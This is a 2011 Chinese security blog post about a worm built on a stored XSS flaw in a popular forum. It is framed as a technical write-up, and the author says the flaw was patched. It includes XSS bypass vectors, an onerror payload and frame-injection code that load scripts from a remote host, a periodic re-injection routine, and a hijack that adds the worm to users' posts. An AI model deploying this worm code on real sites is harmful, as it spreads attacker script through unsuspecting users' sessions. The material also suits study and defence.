<!DOCTYPE html>
<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>一只XSS蠕虫的实现 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="一只XSS蠕虫的实现，前两天，在土司上发一帖子（http://t00ls.net/thread-16240-1-2.html）是关于有传言说DZ X2的0day，结果被很多人踩，打击甚大。首先声明两句，其一，本人从事软件编程工作，从不日站（以后可能），只是空闲之余对WEB安全这一领域十分感兴趣，经常看一些技术博客而已，其二，最近关于DZ X2的0day传言网上到处都是，但是论坛里却没有关于该事件的任何信息，于是在水区发了关于DZ X2的帖子，这可是八卦的地方啊！" />
<meta name="keywords" content="一只XSS蠕虫的实现" />



<meta name="baidu-site-verification" content="GSIJv096Bu" />



<meta name="generator" content="Hugo 0.82.0" />


<link rel="canonical" href="https://lcx.cc/post/1488/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="一只XSS蠕虫的实现" />
<meta property="og:description" content="一只XSS蠕虫的实现，前两天，在土司上发一帖子（http://t00ls.net/thread-16240-1-2.html）是关于有传言说DZ X2的0day，结果被很多人踩，打击甚大。首先声明两句，其一，本人从事软件编程工作，从不日站（以后可能），只是空闲之余对WEB安全这一领域十分感兴趣，经常看一些技术博客而已，其二，最近关于DZ X2的0day传言网上到处都是，但是论坛里却没有关于该事件的任何信息，于是在水区发了关于DZ X2的帖子，这可是八卦的地方啊！" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lcx.cc/post/1488/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2011-06-22T12:28:00&#43;08:00" />
<meta property="article:modified_time" content="2011-06-22T12:28:00&#43;08:00" />

<meta itemprop="name" content="一只XSS蠕虫的实现">
<meta itemprop="description" content="一只XSS蠕虫的实现，前两天，在土司上发一帖子（http://t00ls.net/thread-16240-1-2.html）是关于有传言说DZ X2的0day，结果被很多人踩，打击甚大。首先声明两句，其一，本人从事软件编程工作，从不日站（以后可能），只是空闲之余对WEB安全这一领域十分感兴趣，经常看一些技术博客而已，其二，最近关于DZ X2的0day传言网上到处都是，但是论坛里却没有关于该事件的任何信息，于是在水区发了关于DZ X2的帖子，这可是八卦的地方啊！"><meta itemprop="datePublished" content="2011-06-22T12:28:00&#43;08:00" />
<meta itemprop="dateModified" content="2011-06-22T12:28:00&#43;08:00" />
<meta itemprop="wordCount" content="6962">
<meta itemprop="keywords" content="XSS,0day,app,ASP,CSS,CTF,DZ,EXP,FLASH,hijack,Html,HTTP,IE,IP,Java,js,Microsoft,Net,POS,Shell,URL,Web,安全,博客,测试,查找,程序,代码,恶意,服务,服务器,工具,攻击,管理,函数,技术,脚本,劫持,客户端,跨站,浏览器,漏洞,论坛,绕过,数据,数据库,思路,讨论,网站,文件,系统,邮件,邮箱,注入," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="一只XSS蠕虫的实现"/>
<meta name="twitter:description" content="一只XSS蠕虫的实现，前两天，在土司上发一帖子（http://t00ls.net/thread-16240-1-2.html）是关于有传言说DZ X2的0day，结果被很多人踩，打击甚大。首先声明两句，其一，本人从事软件编程工作，从不日站（以后可能），只是空闲之余对WEB安全这一领域十分感兴趣，经常看一些技术博客而已，其二，最近关于DZ X2的0day传言网上到处都是，但是论坛里却没有关于该事件的任何信息，于是在水区发了关于DZ X2的帖子，这可是八卦的地方啊！"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Nuclear'Atk</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      Nuclear'Atk
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">一只XSS蠕虫的实现</h1>
      
      <div class="post-meta">
        <time datetime="2011-06-22" class="post-time">
          2011-06-22
        </time>
        <div class="post-category">
            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
            <a href="https://lcx.cc/categories/xss/"> XSS </a>
            
          </div>
        <span class="more-meta"> 约 6962 字 </span>
          <span class="more-meta"> 预计阅读 14 分钟 </span>

        
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content">
    
  </div>
</div>

    
    <div class="post-content">
      
<P>一只XSS蠕虫的实现 <br />
 <br />
Author: kunting520&nbsp; &nbsp; &nbsp; &nbsp;  <br />
EMail: <FONT color=#0000ff>kunting520@gmail.com</FONT> <br />
Date: 2011-06-20 <br />
 <br />
[ 目录 ] <br />
 <br />
0×-1 声明 <br />
0×00 前言 <br />
0×01 关于XSS <br />
0×02 发现XSS <br />
0×03 蠕虫实现 <br />
0×04 总结 <br />
 <br />
 <br />
0×-1 声明 <br />
 <br />
&nbsp; &nbsp; 前两天，在土司上发一帖子（<FONT color=#0000ff>http://t00ls.net/thread-16240-1-2.html</FONT>）是关于有传言说DZ X2的0day，结果被很多人踩，打击甚大。首先声明两句，其一，本人从事软件编程工作，从不日站（以后可能），只是空闲之余对WEB安全这一领域十分感兴趣，经常看一些技术博客而已，其二，最近关于DZ X2的0day传言网上到处都是，但是论坛里却没有关于该事件的任何信息，于是在水区发了关于DZ X2的帖子，这可是八卦的地方啊！学习论坛总规则时感觉确实很严，但是但是。。。这不是一般的严啊！有同学说这是我的第一个帖子就要DZ X2的0day不厚道，所以今天发篇帖子和大家讨论下技术，希望能认识论坛里更多的朋友！ <br />
 <br />
0×00 前言 <br />
 <br />
&nbsp; &nbsp; 来土司学习也有段时间，几个可见版块讨论的帖子基本上都是关于渗透的，所以这里发表自己对于XSS的看法，希望感兴趣的同学可以和我讨论。 <br />
&nbsp; &nbsp; 关于XSS，国外早就有开始有人关注了，很多著名的安全人员都将重点放在XSS上，而且水平也达到了很高的程度。幸运的是，国内安全人员从06、07左右也开始研究XSS，那个时候各大门户网站、邮件系统以及搜索巨头等都存在着很明显的XSS漏洞，甚至没有做过任何简单的防护，但是现在不一样了，想发现大型网站的XSS漏洞还是要花费一番功夫的。说实话，对于日站的同学来说，XSS确实没有SQL注入、文件上传漏洞、远程文件包含来的实在，有时候可以直接获取WebShell甚至拿到系统的控制权，而XSS，虽然它在渗透服务器过程中有着十分重要的作用，但是归根结底它是用来针对客户端用户（浏览器用户）的攻击，当然包括网站的管理员。然而在大多数人眼里，XSS已经俨然演化为alert(/xss/)，在某个网站的页面出现弹框了，就发生了XSS了，其实远没有，那只是个开始。要想将XSS利用的完美确实是一门艺术，你需要对网站的结构有足够的了解，需要扎实的JS功底。 <br />
前几天和一同学交流，得到消息说，国内外各大邮箱系统，只要是国人常用的（我所知道的）除gmail外，全部被查找出XSS漏洞，并且相关利用产品已经开发出来，有的甚至不需要点击链接、不需要浏览邮件，进了邮箱即受到攻击。攻击的内容甚是恐怖，大家可以想象。所以使用邮箱的用户注意了，也许有那么一天别人登录了你的邮箱。 <br />
0×01 关于XSS <br />
 <br />
&nbsp; &nbsp;&nbsp;&nbsp;XSS亦即跨站点脚本，它被赋予了两层意思，一是指跨站点脚本漏洞，一是指利用跨站点脚本漏洞进行的攻击。它的本质是恶意攻击者提交的数据在另一客户端被当做代码执行了。这里包含两点，一是由于程序编写的原因，将用户提交的数据当做代码执行了（这和缓冲区溢出很类似），二是XSS攻击是针对客户端用户（浏览器）的攻击，攻击者的shellcode是运行在浏览器上的，并不是运行在服务器上。基于上述XSS的本质，那么XSS漏洞发生的根本原因也有两个，这也是所以程序漏洞产生的根本即：”程序员的一切假设都是危险的，用户的一切输入都是有害的”。 <br />
&nbsp; &nbsp; XSS漏洞主要分为三类：存储型XSS，这是危害最大的一类XSS，出现在用户输入数据以使其他用户查看的地方，这样的地方有很多包括文章、评论、邮件、留言以及其他任何用户输入并且保存到数据库的地方。当攻击者提交恶意输入，应用程序将其存储到数据库，其他用户浏览了相关页面，此时应用程序将提取数据库中恶意数据显示到浏览器上，从而得到执行引起XSS攻击。反射型XSS，这是存在最多的一类XSS，乌云()里面到处都是这类漏洞，另外国外一网站xssed.com也收集了大量的这类漏洞，感兴趣的同学可以去看看。这类漏洞的产生是因为程序员为了方便（可能是其他原因），直接在URL中加入消息参数，并且未将该参数经任何过滤，当用户请求包含恶意代码的URL时，经过服务器反射回来直接显示到页面中，于是恶意代码得到执行，在利用该类XSS时，存在的不足是需要用户的点击。很多扫描工具都支持发掘这类XSS，所以才导致乌云上的泛滥。还有一类是基于DOM的XSS漏洞，这类漏洞比较少见，它很类似反射型的XSS，不同的是利用了客户端脚本中的DOM技术，测试工具主要是火狐的一个扩展dominator，目前支持到FF3.6。 <br />
&nbsp; &nbsp; 结合XSS的其他：CSRF现在确实是老生常谈了，中文是指跨站点请求伪造，相关资料可以参考lake2的文章；Flash也是可以XSS以及CSRF的。关于Flash跨站也十分的流行，很多网站（以SNS为主）都存在过此类漏洞，OWASP也相当重视，测试工具有很多，可参考OWASP中文测试指南，其次，大家可以关注下余弦的博客。当然不止这些，基本上所有使用脚本的地方都可以，例如HTML元素、属性，CSS，XML文档，Flash，除此之外还有PDF、WORD以及各种软件如林格斯、rar自解压等，这里不再细述。 <br />
 <br />
0×02发现XSS <br />
 <br />
&nbsp; &nbsp;&nbsp;&nbsp;如何查找网站的XSS呢？像Acunetix WVS、IBM的AppScan、华为的WebCruiser、诺赛科技的JSky都提过了非常好的XSS扫描功能。但是光靠工具是不行的，有时候网站会做些过滤，那么就得手工绕过了。Rsnake的网站上提供了非常齐全的XSS Cheat Sheet <FONT color=#0000ff>http://ha.ckers.org/xss.html</FONT>，介绍了使用各种方法向页面插入测试代码，以及如何绕过网站的简单过滤。不过貌似很久都没更新了，仅仅在IE6.0-7.0,以及Firefox2.0等浏览器上进行测试，然而现在出了Chrome，貌似安全性很强，IE都已经到9了，FF也到了5（可以下载，官方尚未公布），所以很多测试代码现在并不可用。 <br />
&nbsp; &nbsp; 那么什么地方可以插入XSS攻击代码呢？这里简单讨论HTML以及CSS的插入脚本的方法，实际上在XSS Cheat Sheet中已经完全列出： <br />
&nbsp; &nbsp; a)无任何过滤：直接在表单中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;，注意单引号的闭合。 <br />
&nbsp; &nbsp; b)利用事件：插入图片&lt;img src=”1.jpg” onerror=”javascript:alert(/xss/)”&gt;，很多网站存在。 <br />
&nbsp; &nbsp; c)利用其他标记： &lt;img src=”javascript:alert(/xss/)”&gt;，可惜IE7以后不再支持绝大多数。 <br />
&nbsp; &nbsp; d)利用expression：很多网站都倒在这上面了，包括百度、校内，第一个XSS蠕虫（Samy蠕虫（<FONT color=#0000ff>http://namb.la/popular/tech.html</FONT>））也是利用了expression，&lt;img style="xss:expression(alert(/xss/))"&gt;。当然利用expression也会有个缺点，表达式中的代码会一直重复执行。 <br />
&nbsp; &nbsp; e)利用@import：&lt;style&gt;@import url(<FONT color=#0000ff>http://xxx.xxx.xxx/xss.css</FONT>); &lt;/style&gt;，导入CSS代码，可以利用d)嵌入脚本。 <br />
&nbsp; &nbsp; 这里只是简单举例，具体请参照XSS Cheat Sheet，以及其他技术博客如monyer（<FONT color=#0000ff>http://hi.baidu.com/monyer</FONT>）等，他们都介绍了如何运用各种手段绕过网站的过滤（净化）。以上都是关于XSS的简单介绍，下面分享下如何发现某论坛的XSS漏洞以及编写蠕虫的思路。 <br />
&nbsp; &nbsp; 此次发现XSS漏洞并实现XSS蠕虫纯属偶然。某日上一著名YY论坛，发现其页面有较大横幅提示说论坛全新改版，请大家关注。看到这几个字便萌生了测试XSS的想法，首先将键盘上所有的敏感字符全部输一遍提交，看看其过滤情况，结果发现论坛程序并未使用HTML编码，看到希望HAPPY。随即提交了”kunting520&lt;script&gt;var kt;&lt;/script&gt;”（不建议使用alert()，会被警觉的管理员发现），查看返回的源代码，只剩下”kunting520”，&lt;script&gt;标记以及包含的内容已经不在了，看来是利用正则对特定标记做了过滤。再经过一段时间的查找，发现插入图片等多个地方可以XSS，具体代码如下：</P>
<P>
<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
<TBODY>
<TR>
<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">以下是引用片段：</FONT></P>
<P>&lt;img src = "1.jpg" onerror = "javascript: var s=document.createElement('script'); s.src= 'http://222.222.222.222:2222/13.j'; document.body.appendChild(s);" &gt;</P></TD></TR></TBODY></TABLE></P>
<P>这样便成功向当前页面插入一段JS脚本。值得注意的是，不知道为什么该论坛会对用户提交的数据在客户端本地会做一定的修改，例如这里的appendChild会修改成appendchild，由于JS严格要求大小写，所有这段脚本是不可能执行成功的。于是抓包修改，提交成功。 <br />
 <br />
0×03蠕虫实现 <br />
 <br />
&nbsp; &nbsp;&nbsp;&nbsp;这里不讨论如何去实现XSS蠕虫的恶意功能，关于利用XSS进行更加有效、简单的攻击，已经有产品化的工具出现，如国外的BEEF(<FONT color=#0000ff>http://www.bindshell.net/tools/beef.html</FONT>)、XSS Shell (<FONT color=#0000ff>http://labs.portcullis.co.uk/application/xssshell/</FONT>)以及国内大风等人的开源作品Anehta ( <FONT color=#0000ff>http://code.google.com/p/anehta/</FONT> )等等。有兴趣的读者可以参考下。这里主要讨论如何去实现XSS蠕虫代码的繁殖，毕竟这才是其能够称作为XSS蠕虫的首要条件。 <br />
&nbsp; &nbsp;&nbsp;&nbsp;先介绍下该论坛的结构（哎，其实你们知道的，但是土司总规则。。。），主域名是xxx.com，其下有很多二级域名以cyg.xxx.com最为出名，访问量极其高。本次的XSS漏洞就是发生在该二级域网站下面。该二级域的结构主要包含两个，一个是显示帖子标题列表的主框架（位于整个页面的左方一小部分），另一个是显示帖子内容的子框架（位于右方），当单击列表中某一标题时，便会向服务端发送HTTP请求，并将返回的内容写入到子框架中。我只想编写出一个利用保存型XSS漏洞的蠕虫，这样当客户端用户浏览了包含蠕虫代码的页面，便会受到感染，并不希望以单击链接的形势传播，容易被发觉，且传播较慢。那么如何做到传播呢？ <br />
&nbsp; &nbsp;&nbsp;&nbsp;a)该论坛不像SNS如人人网一样，以人为本，大家都在自己的一个小圈子里，各个圈子是有交集的，每个人都有自己的主页以供他人浏览，所以SNS蠕虫常常将shellcode嵌入到用户的个人资料中，当正常用户访问资料时便受到感染，从而将更改正常用户的资料嵌入shellcode，或者是通过发表一篇包含蠕虫代码的文章，当正常用户浏览了该文章便会分享或者也发表类似的文章，从而感染用户以指数增长；然而该论坛是以帖子为主，各个用户通过帖子、帖子回复进行交流，并不存在个人主页等等，那么感染用户资料是不现实的（确实有，内容很少，且在另一个二级域），通过发表相似帖子来到达一传十，十传百是也是不可能的，且容易被发现（都会被置顶）； <br />
&nbsp; &nbsp; b)不能任意发文章，那么对已经发表的每个帖子进行恶意回复如何？这是我开始的思路，但是注意了，前面说所有的文章、回复都是显示在页面的子框架中，当该页面被刷新，蠕虫的脚本代码就没了（由于跨站点脚本漏洞是被动式的攻击，我们只能在对方站点有漏洞的页面加入恶意的javascript，用户只有访问了特定的页面才会触发漏洞，而离开这个页面，攻击也就随之失效。），所以在没被刷新赶紧POST数据出去，论坛的评论的URL是<FONT color=#0000ff>http://cyg.xxx.com</FONT> /topic/addReply.do，POST的内容包括uid、sid以及body等参数，其中sid是帖子ID号，body为评论内容。这样应该可以了吧，接着测试遇到问题，为了防止CSRF，该论坛对每个提交的请求进行了严格的refferer消息头的检查，因此必须访问到帖子才能进行回复，于是这条路断了； <br />
&nbsp; &nbsp; c)经过一段时间的思考，决定使用框架注入技术。步骤如下：现在我发了一篇包含蠕虫代码的帖子，当正常用户在主框架中点击帖子的标题时，子框架会将包含蠕虫的页面加载进来，这个时候蠕虫通过js操作主框架的DOM，向主框架页面中加入脚本，具体实现：</P>
<P>
<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
<TBODY>
<TR>
<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">以下是引用片段：</FONT></P>
<P>var topscript = parent.document.createElement("script"); <br />
parent.document.body.appendChild(topscript); <br />
topscript.src = "http://222.222.222.222:2222/hij.js";</P></TD></TR></TBODY></TABLE></P>
<P>这样主框架页面我也能够控制了，那么下一步是当用户刷新子框架页面时，保存在主框架中蠕虫脚本将向新页面注入恶意JS，从而重新控制用户的子框架。这样受感染用户浏览的任意一篇帖子都会存在蠕虫脚本，即使该子框架页面源码中没有蠕虫载体，具体实现：</P>
<P>
<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
<TBODY>
<TR>
<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">以下是引用片段：</FONT></P>
<P>function creatScript() <br />
{ <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!document.getElementById("rightframe")||!document.frames["rightframe"]) <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return; <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var rightframe = document.getElementById("rightframe").contentDocument || document.frames["rightframe"].document;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //获取子框架的document对象 <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(rightframe.getElementById("kunting520")==null)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //这里判断子框架是否已经被注入脚本 <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {; <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var s=document.createElement("script"); <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s.setAttribute("id","kunting520"); <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s.src="http://222.222.222.222:2222/kt.js"; <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rightframe.body.appendChild(s); <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
} <br />
setInterval(creatScript,20000);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //每个20s运行一次函数</P></TD></TR></TBODY></TABLE></P>
<P>d)单个用户是搞定了，如何进行传播呢？为了不让用户察觉或者不让蠕虫过早的被管理员发现，这里并没有借助控制每个感染用户恶意发帖（在a中讨论过）。而是利用HiJack技术，劫持用户的行为，这里主要是劫持用户发帖以及发评论的动作，并向发表的内容中加入蠕虫载体，主要实现如下：</P>
<P>
<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
<TBODY>
<TR>
<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">以下是引用片段：</FONT></P>
<P>function hijackLinks() <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var as=document.links; <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(var i=0;i&lt;as.length;i++){ <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(as[i].href=="javascript:MOP.DZH.formSubmitNormal();") <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; as[i].href="javascript:hijack();MOP.DZH.formSubmitNormal();"; <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</P></TD></TR></TBODY></TABLE></P>
<P>这里MOP.DZH.formSubmitNormal()函数是提交帖子、评论的函数，hijack()函数是蠕虫自己的函数，用于向准备发送的HTTP请求中添加蠕虫载体代码，并且在劫持之后需要进行再次调用MOP.DZH.formSubmitNormal()函数，否则发不了帖子。前面说过该论坛的JS会对用户输入的内容做一定的修改，应该是在MOP.DZH.formSubmitNormal()函数之前进行的，因为我抓包测试，蠕虫追加的内容在发送出去之后并未做任何修改。这样蠕虫的传播便实现了。 <br />
e)关于DDOS <br />
&nbsp; &nbsp;&nbsp;&nbsp;绝大部分的XSS蠕虫是为了收集信息，将从各个客户端获取到的信息发送到自己的服务器上，如果考虑不全，会导致服务器被自己的XSS蠕虫给DDOS，因为SNS服务商使用的是高性能服务器集群，而收集信息的服务器很可能是一台性能不错的笔记本！这种确实情况是存在的，今年的4月29日开始，在人人爆发了一次大规模收集信息的XSS蠕虫，具体代码参考<FONT color=#0000ff>http://pastebin.com/HKZ0UV30</FONT>，结果悲剧的是攻击者的服务器被D掉了。 <br />
 <br />
0×04 总结 <br />
&nbsp; &nbsp; a)总体来说本蠕虫编写还算顺利，没有遇到什么大的障碍，主要的时间是花在抓包以及调试上面，大概用了三天时间。但是天下莫大的悲剧就是蠕虫刚编写出来，漏洞就被补了，因此才敢在这里将代码发出来，希望能给研究XSS的朋友提供个思路。 <br />
&nbsp; &nbsp; b)来土司这么久，发现论坛里的技术帖，绝大部分是讨论关于日站的思路以及经验的，所以才会发一XSS相关帖子，本帖子很大篇幅是对前人技术的总结，希望起到抛砖引玉的作用，能给论坛带来一个讨论XSS好的开头。 <br />
&nbsp; &nbsp; c)编写XSS蠕虫最为关键的步骤是如何去将蠕虫传播的更远更快，体积大小也是常常考虑的问题，在RSnake的论坛也有专门讨论的帖子Diminutive XSS Worm Replication Contest（<FONT color=#0000ff>http://sla.ckers.org/forum/read.php?2</FONT>,18790,page=19），在FF2.0和IE7.0上最小的可传播的JS载体居然只有155个字符。 <br />
&nbsp; &nbsp; d)关于如何测试XSS、CSRF、SQL注入等各种WEB漏洞，08年的时候，OWASP给出一个中文测试指南（<FONT color=#0000ff>https://www.owasp.org/images/0/06/OWASP</FONT>测试指南(中文）.pdf），里面介绍了各种漏洞的原理，以及测试方案，并且提供了相关资料包括书籍、白皮书以及测试工具等等。 <br />
